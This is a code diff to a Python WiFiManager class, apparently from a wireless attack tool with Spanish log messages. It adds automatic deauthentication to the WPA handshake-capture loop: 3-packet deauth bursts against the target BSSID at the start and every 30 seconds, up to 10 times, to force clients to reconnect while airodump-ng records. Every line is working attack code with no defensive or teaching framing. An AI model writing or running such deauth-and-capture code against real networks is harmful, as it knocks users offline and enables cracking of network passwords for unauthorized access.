@@ -330,15 +330,32 @@ class WiFiManager:
     def _monitor_handshake(self, output_prefix: str, bssid: str):
         from core.utils import check_handshake_in_cap
         checks = 0
+        auto_deauths = 0
+        max_auto_deauths = 10
+        deauth_every = 15  # every 15 × 2s = 30s
+
+        # Give airodump-ng 3 seconds to start and lock the channel, then send initial deauth
+        time.sleep(3)
+        if self._capturing and self.monitor_interface:
+            self.send_deauth(bssid, None, 3, self.monitor_interface)
+            self._log(f"[auto-deauth] Inicial → {bssid} (3 paquetes)")
+
         while self._capturing and checks < 300:
             time.sleep(2)
             checks += 1
+
+            # Periodic deauth every ~30 s to force fresh reconnections
+            if checks % deauth_every == 0 and auto_deauths < max_auto_deauths and self.monitor_interface:
+                self.send_deauth(bssid, None, 3, self.monitor_interface)
+                auto_deauths += 1
+                self._log(f"[auto-deauth] #{auto_deauths} → {bssid}")
+
             cap = self._find_cap_file(output_prefix)
             if cap:
-                found, _ = check_handshake_in_cap(cap)
+                found, msg = check_handshake_in_cap(cap)
                 if found:
                     self._emit_handshake(bssid)
-                    self._log(f"HANDSHAKE detectado: {bssid} ({cap})")
+                    self._log(f"HANDSHAKE detectado: {bssid} ({cap}) — {msg}")
                     return
         if self._capturing:
             self._log("Timeout: no se capturó handshake tras 10 min")
